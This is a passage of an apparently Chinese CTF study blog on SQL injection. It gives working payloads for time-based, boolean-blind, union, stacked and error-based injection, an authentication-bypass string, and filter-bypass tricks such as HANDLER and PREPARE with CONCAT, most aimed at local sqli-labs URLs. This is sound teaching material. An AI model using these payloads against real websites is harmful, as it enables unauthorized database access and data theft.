title="时间盲注(字符型为例)"></a>时间盲注(字符型为例)</h4><p>仅要求有回显，主要原理是利用SQL中if函数及sleep函数再加上其他用于拆解字符串、转换字符为ASCII码值的函数，sleep函数作为if函数的第二个参数，猜解名称的函数作为if的第一个参数，第三个参数可以任意赋值，但不能与sleep函数相同，因此若猜解函数返回正确，则执行sleep函数，效果为网页延迟了设定的描述才显示。</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> and <span class="title function_">if</span> <span class="params">((ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">100</span>),sleep(<span class="number">3</span>),<span class="number">1</span>)</span> # <span class="comment">//判断数据库名称第一个字符是否为&#x27;d&#x27;，结果显示明显延迟</span></span><br></pre></td></tr></table></figure></div><h2 id="三、判断注入点"><a href="#三、判断注入点" class="headerlink" title="三、判断注入点"></a>三、判断注入点</h2><h3 id="3-1判断是否存在SQL注入漏洞"><a href="#3-1判断是否存在SQL注入漏洞" class="headerlink" title="3.1判断是否存在SQL注入漏洞"></a>3.1判断是否存在SQL注入漏洞</h3><p>输入<code>1&#39;</code>如果报错，则存在注入漏洞，报错原因是单引号数量不匹配，如果没报错，说明可能该网页过滤了单引号</p><h3 id="3-2判断是字符型还是整数型"><a href="#3-2判断是字符型还是整数型" class="headerlink" title="3.2判断是字符型还是整数型"></a>3.2判断是字符型还是整数型</h3><ul><li>输入<code>1 and 1=2</code>和<code>1&#39;#</code>和<code>1&#39; and &#39;1&#39;=&#39;1</code>若都回显id为1的信息,则为字符型</li><li>输入<code>1 and 1=2</code>没有回显，且输入<code>1 and 1=1</code>有回显，则为数字型,原因<code>1 and 1=2</code>恒为假，过滤掉所有的行</li></ul><h3 id="3-3判断能否时间盲注"><a href="#3-3判断能否时间盲注" class="headerlink" title="3.3判断能否时间盲注"></a>3.3判断能否时间盲注</h3><table><thead><tr><th align="left">MySQL</th><th align="left">benchmark(100000000,md(5))sleep(3)</th></tr></thead><tbody><tr><td align="left">PostgreSQL</td><td align="left">PG_sleep(5)Generate_series(1,1000000)</td></tr><tr><td align="left">SQLServer</td><td align="left">waitfor delay ‘0:0:5’</td></tr></tbody></table><h3 id="3-4判断数据库类型"><a href="#3-4判断数据库类型" class="headerlink" title="3.4判断数据库类型"></a>3.4判断数据库类型</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Mysql数据库<span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> information_schema.tables) #</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 access数据库<span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> msysobjects) #</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Sqlserver数据库<span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> sysobjects) #</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是Oracle数据库<span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> dual)<span class="operator">&gt;</span><span class="number">0</span> #</span><br></pre></td></tr></table></figure></div><h2 id="四、常用函数、基础知识"><a href="#四、常用函数、基础知识" class="headerlink" title="四、常用函数、基础知识"></a>四、常用函数、基础知识</h2><h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><ul><li>system_user()——系统用户名 </li><li>user()——用户名 </li><li>current_user()——当前用户名 </li><li>session_user()——链接数据库的用户名 </li><li>database()——数据库名 </li><li>version()——数据库版本 </li><li>@@datadir——数据库路径 </li><li>@@basedir——数据库安装路径 </li><li>@@version_conpile_os——操作系统</li></ul><h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><ul><li>concat(str1,str2,…)——没有分隔符地连接字符串 </li><li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串 </li><li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据。</li></ul><h3 id="两种注释"><a href="#两种注释" class="headerlink" title="两种注释"></a>两种注释</h3><ul><li>–+</li><li><code>#</code>(url编码%23)</li></ul><h3 id="sql中的逻辑运算"><a href="#sql中的逻辑运算" class="headerlink" title="sql中的逻辑运算"></a>sql中的逻辑运算</h3><p>万能密码构造</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>’admin’ andpassword<span class="operator">=</span>’’<span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div><blockquote><p>在sql中and运算符优先级大于or运算符，类比&amp;&amp;&gt;||</p></blockquote><p>sql中也能使用位运算</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="operator">&amp;</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></div><blockquote><p>&amp;的优先级大于&#x3D;</p></blockquote><h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 字段 [<span class="keyword">asc</span><span class="operator">|</span><span class="keyword">desc</span>]; # <span class="keyword">asc</span>升序，默认的</span><br></pre></td></tr></table></figure></div><blockquote><p>用于判断列数，不知道列名时用1 2 3……表示第1 2 3……列</p></blockquote><h3 id="系统数据库（information-schema）"><a href="#系统数据库（information-schema）" class="headerlink" title="系统数据库（information_schema）"></a>系统数据库（information_schema）</h3><p>mysql版本&gt;&#x3D;5.0</p><p>该库中有三个表schemata(各数据库名schema_name)、tables(各表名table_name)、columns(各列名)</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata # 查数据库名</span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;xxxxx&#x27;</span>; #查表名</span><br><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;xxxxx&#x27;</span>; #查列名 </span><br></pre></td></tr></table></figure></div><h2 id="五、注入类型"><a href="#五、注入类型" class="headerlink" title="五、注入类型"></a>五、注入类型</h2><h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><p><strong>依据注入点类型分类</strong></p><ul><li><p>数字类型的注入</p></li><li><p>字符串类型的注入</p></li><li><p>搜索型注入</p></li></ul><p><strong>依据提交方式分类</strong></p><ul><li><p>GET注入</p></li><li><p>POST注入</p></li><li><p>COOKIE注入</p></li><li><p>HTTP头注入(XFF注入、UA注入、REFERER注入）</p></li></ul><p><strong>依据获取信息的方式分类</strong></p><ul><li><p>基于布尔的盲注</p></li><li><p>基于时间的盲注</p></li><li><p>基于报错的注入</p></li><li><p>联合查询注入</p></li><li><p>堆叠注入 (可同时执行多条语句)</p></li></ul><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>要求列数一致</p><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>  <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div><blockquote><p>整型的也差不多，去掉’</p><p>部分题目也可能在字符型基础上加括号等,若注释被屏蔽</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> …… <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure></div></blockquote><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>多条sql语句一起执行,利用加<code>;</code>的操作</p><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>受到API或数据库引擎不支持，权限不足等</p><h3 id="常见思路"><a href="#常见思路" class="headerlink" title="常见思路"></a>常见思路</h3><p>可考虑使用RENAME关键字，将想要的数据列名&#x2F;表名更改成返回数据的SQL语句所定义的表&#x2F;列名。</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> tables; #查看所有表</span><br><span class="line"><span class="keyword">show</span> columns <span class="keyword">from</span> `表名`; #看列</span><br><span class="line">RENAME <span class="keyword">TABLE</span> `words` <span class="keyword">TO</span> `words1`; #改名为words1</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `words` CHANGE `flag` `id` <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>;#将新words表的列flag改为id</span><br></pre></td></tr></table></figure></div><h3 id="常见bypass"><a href="#常见bypass" class="headerlink" title="常见bypass"></a>常见bypass</h3><p>过滤select时，使用handler语句（mysql专用语句）</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">handler users <span class="keyword">open</span> <span class="keyword">as</span> hd; #指定数据表users进行载入并将返回句柄重命名为hd</span><br><span class="line">handler hd read <span class="keyword">first</span>; #读取指定表<span class="operator">/</span>句柄的首行数据</span><br><span class="line">handler hd read next; #读取指定表<span class="operator">/</span>句柄的下一行数据</span><br><span class="line">handler hd <span class="keyword">close</span>; #关闭句柄</span><br></pre></td></tr></table></figure></div><p>预处理</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">prepare</span> xxx <span class="keyword">from</span> &quot;sql语句&quot;;</span><br><span class="line"><span class="keyword">execute</span> xxx;</span><br><span class="line">#由于<span class="keyword">sql</span>语句是字符串，因此可以使用操作字符串的函数，绕过一些过滤</span><br><span class="line">#比如过滤了<span class="keyword">select</span></span><br><span class="line"><span class="keyword">PREPARE</span> st <span class="keyword">from</span> concat(<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;elect&#x27;</span>, <span class="string">&#x27; * from `1919810931114514`&#x27;</span>);<span class="keyword">EXECUTE</span> st;#</span><br></pre></td></tr></table></figure></div><p>例题：强网杯随便注</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="截取字符串常用函数"><a href="#截取字符串常用函数" class="headerlink" title="截取字符串常用函数"></a>截取字符串常用函数</h3><ul><li><p>mid(): <code>mid(s,n,len);</code> 从字符串 s 的 n 位置截取长度为 len 的子字符串</p></li><li><p>substr()&#x2F;substring(): <code>substr(s, start, length); substring(s, start, length)</code> 从字符串 s 的 start 位置截取长度为 length 的子字符串</p></li><li><p>left(): <code>left(s,n);</code> 返回字符串 s 的前 n 个字符</p></li><li><p>right(): <code>right(s,n);</code> 返回字符串 s 的后 n 个字符</p></li><li><p>ascii()&#x2F;ord() <code>ascii(s);/ord(s);</code> 返回字符串 s 的第一个字符的 ASCII 码。 这里不考虑多字节字符，比如汉字</p></li><li><p>trim()&#x2F;rtrim()&#x2F;ltrim() </p><ul><li><code>ltrim(s);</code> 去掉字符串s开始处的空格 </li><li><code>rtrim(s);</code> 去掉字符串s结尾处的空格 </li><li><code>trim(s);</code> 去掉字符串开始和结尾处的空格</li></ul><blockquote><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">TRIM</span>([<span class="keyword">BOTH</span><span class="operator">/</span><span class="keyword">LEADING</span><span class="operator">/</span><span class="keyword">TRAILING</span>] 目标字符串 <span class="keyword">FROM</span> 源字符串);</span><br><span class="line"><span class="keyword">BOTH</span>删除两边的指定字符串 </span><br><span class="line"><span class="keyword">LEADING</span>删除左边的指定字符串 </span><br><span class="line">TARILING删除右边的指定字符串</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">trim</span>(<span class="keyword">LEADING</span> &quot;a&quot; <span class="keyword">from</span> &quot;abcd&quot;) <span class="operator">=</span> <span class="built_in">trim</span>(<span class="keyword">LEADING</span> &quot;b&quot; <span class="keyword">from</span> &quot;abcd&quot;);</span><br></pre></td></tr></table></figure></div><p>以这个为例，我们将删除的字符串ASCII差限制在1，例如a和b 当这个结果返回0时(说明有一个成功匹配)，则第一个字符是a或者b。 </p><p>接着让a的ASCII+2变成c，如果返回1(bc都不匹配)，则字符串第一位为a，反之第一位为b。</p><p>这样做的目的是为了方便写脚本 第二个字符判断 select trim(LEADING “aa” from “abcd”) &#x3D; trim(LEADING “ab” from “abcd”); 接着重复上面的过程，判断第二个字符 以此推出整个字符串</p><p>如果&#x3D;用regexp替代那么正确的字符一定在regexp前面以这个abcd为例 Trim(leading ‘a’ from ‘abcd’) regexp trim(LEADING ‘x’ from ‘abcd’) 就是bcd regexp abcd返回0， 如果反过来就是abcd regexp bcd 返回1 因此只需判断第一步即可，而不需要ASCII+2去判断了 </p><p>⚠️：如果用regexp，要先在<code>trim(LEADING &quot;a&quot; from &quot;abcd&quot;) != trim(LEADING &quot;b&quot; from &quot;abcd&quot;)</code>的条件下，因为两个相同字符串间的regexp也会返回1</p><p>注：y1ng师傅在[HFCTF 2021 Final]hatenum中用到了这个方法，通过持续递归，多次套娃trim。如果字符串长度被限制，可使用。一次只截断几个字符</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">trim</span>(<span class="keyword">LEADING</span> &quot;b&quot; <span class="keyword">from</span> <span class="built_in">trim</span>(<span class="keyword">LEADING</span> &quot;a&quot; <span class="keyword">from</span> &quot;abcd&quot;)); <span class="comment">-- cd </span></span><br></pre></td></tr></table></figure></div><p>先截断a，返回字符串bcd，在截断b，返回字符串cd</p></blockquote></li><li><p>Insert()</p><blockquote><p><code>INSERT(s1,x,len,s2)</code> 字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">例子：第一步删除起始的前x位</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">INSERT</span>(&quot;abcdef&quot;, <span class="number">1</span>,<span class="number">0</span>, &quot;&quot;);</span><br><span class="line"><span class="comment">-- 输出：abcdef</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">INSERT</span>(&quot;abcdef&quot;, <span class="number">1</span>,<span class="number">1</span>, &quot;&quot;);</span><br><span class="line"><span class="comment">-- 输出：bcdef</span></span><br><span class="line">第二步套娃删除x<span class="operator">+</span><span class="number">1</span>位以后的所有</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">INSERT</span>((<span class="keyword">INSERT</span>(&quot;abcdef&quot;, <span class="number">1</span>,<span class="number">0</span>, &quot;&quot;)),<span class="number">2</span>,<span class="number">9999</span>,&quot;&quot;);</span><br><span class="line"><span class="comment">-- 输出：a</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">INSERT</span>((<span class="keyword">INSERT</span>(&quot;abcdef&quot;, <span class="number">1</span>,<span class="number">1</span>, &quot;&quot;)),<span class="number">2</span>,<span class="number">9999</span>,&quot;&quot;);</span><br><span class="line"><span class="comment">-- 输出：b</span></span><br></pre></td></tr></table></figure></div></blockquote></li></ul><h3 id="盲注常用方法"><a href="#盲注常用方法" class="headerlink" title="盲注常用方法"></a>盲注常用方法</h3><ul><li><p>if&#x2F;case 用在select查询当中，当做一种条件来进行判断</p><blockquote><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(条件,为真结果,为假结果)</span><br><span class="line"># <span class="keyword">case</span>语法（两种）</span><br><span class="line">简单函数 </span><br><span class="line"><span class="keyword">CASE</span> [col_name] <span class="keyword">WHEN</span> [value1] <span class="keyword">THEN</span> [result1]…<span class="keyword">ELSE</span> [<span class="keyword">default</span>] <span class="keyword">END</span></span><br><span class="line">搜索函数 </span><br><span class="line"><span class="keyword">CASE</span> <span class="keyword">WHEN</span> [expr] <span class="keyword">THEN</span> [result1]…<span class="keyword">ELSE</span> [<span class="keyword">default</span>] <span class="keyword">END</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span> <span class="keyword">when</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">when</span> <span class="string">&#x27;b&#x27;</span> <span class="keyword">then</span> <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>; #<span class="number">2</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">when</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">then</span> <span class="number">1</span>  <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>; #<span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="number">98</span><span class="operator">&gt;</span><span class="number">12</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">when</span> <span class="number">3</span><span class="operator">&lt;</span><span class="number">1</span> <span class="keyword">then</span> <span class="number">2</span> <span class="keyword">when</span> <span class="number">98</span><span class="operator">&gt;</span><span class="number">3</span> <span class="keyword">then</span> <span class="number">3</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>; #<span class="number">1</span></span><br></pre></td></tr></table></figure></div><p>搜索函数优先匹配第一个为真的条件,也可以只写一个条件，代替if语句</p></blockquote></li><li><p>regexp&#x2F;rlike 正则表达式注入（可以代替if）</p><blockquote> <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(if((<span class="keyword">user</span>() regexp <span class="string">&#x27;^r&#x27;</span>),<span class="number">1</span>,<span class="number">0</span>));</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">user</span>() regexp<span class="string">&#x27;^ri&#x27;</span>); # i表示不区分大小写</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>);</span><br></pre></td></tr></table></figure></div> <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables</span><br><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name regexp <span class="string">&#x27;^us[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div><p> 这里只要更换regexp表达式即可</p><p> <figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032231275.jpg"                      alt="image-20220708162044974"                ><figcaption>image-20220708162044974</figcaption></figure></p><p> 注：regexp不区分大小写，需要大小写敏感要加上binary关键字</p> <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">binary</span> database() regexp &quot;^CTF&quot;;</span><br></pre></td></tr></table></figure></div></blockquote></li><li><p>like匹配注入(适用于&#x3D;被过滤)</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;ro%&#x27;</span>;</span><br></pre></td></tr></table></figure></div></li><li><p>benchmark函数 测试操作性能</p></li><li><p>get_lock</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>第一个连接</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> get_lock(<span class="string">&#x27;aaa&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> get_lock(<span class="string">&#x27;aaa&#x27;</span>,<span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>打开另一个cmd  再次连接mysql，执行get_lock，发现延时</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> get_lock(<span class="string">&#x27;aaa&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> get_lock(<span class="string">&#x27;aaa&#x27;</span>,<span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">1.00</span> sec)</span><br></pre></td></tr></table></figure></div><blockquote><p>利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用mysql_pconnect(打开一个到 MySQL 服务器的持久连接)函数来连接数据库。在CTF中，只有出题人很刻意的使用这个函数，才暗示使用这个</p></blockquote></li></ul><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">115</span>,<span class="number">0</span>,sleep(<span class="number">5</span>))#</span><br><span class="line"># sleep延时</span><br><span class="line"><span class="keyword">select</span> sleep(find_in_set(mid(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;0,1,2,3,4,5,6,7,8,9,.&#x27;</span>));# 在<span class="number">0</span><span class="number">-9.</span>中找版本号第一位</span><br></pre></td></tr></table></figure></div><blockquote><p>sleep函数延时不常用，时间可能因网速影响</p></blockquote><p>利用BENCHMARK()进行延时注入 </p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27;</span><span class="keyword">UNION</span> <span class="keyword">SELECT</span> (IF(<span class="built_in">SUBSTRING</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="type">CHAR</span>(<span class="number">115</span>),BENCHMARK(<span class="number">50000000</span>,ENCODE(<span class="string">&#x27;MSG&#x27;</span>,<span class="string">&#x27;by 5 seconds&#x27;</span>)),<span class="keyword">null</span>)),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">FROM</span> (<span class="keyword">select</span> database() <span class="keyword">as</span> <span class="keyword">current</span>) <span class="keyword">as</span> tb1<span class="comment">--+</span></span><br><span class="line"># 当结果正确的时候，运行ENCODE(<span class="string">&#x27;MSG&#x27;</span>,<span class="string">&#x27;by 5 seconds&#x27;</span>)操作<span class="number">50000000</span> 次，会占用一段时间。</span><br></pre></td></tr></table></figure></div><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="报错盲注–floor报错"><a href="#报错盲注–floor报错" class="headerlink" title="报错盲注–floor报错"></a>报错盲注–floor报错</h3><p><u>适用于低版本，mysql8似乎被修复</u></p><p>floor报错注入是利用 <code>select count(*),(floor(rand(0)*2)) x from users group by x</code>这个相对固定的语句格式，导致的数据库报错</p><h4 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h4><ul><li>rand() 是一个随机函数(产生0到1间随机浮点数),直接使用每次产生的数都不同，但是当提供了一个固定的随机数的种子0之后：这样每次产生的值都是一样的。</li><li>floor(rand(0)*2） floor()是向下取整，这样可以得到只含0 1的伪随机序列</li></ul><h4 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h4><p>当执行以下语句时会报错(主键冲突)</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span 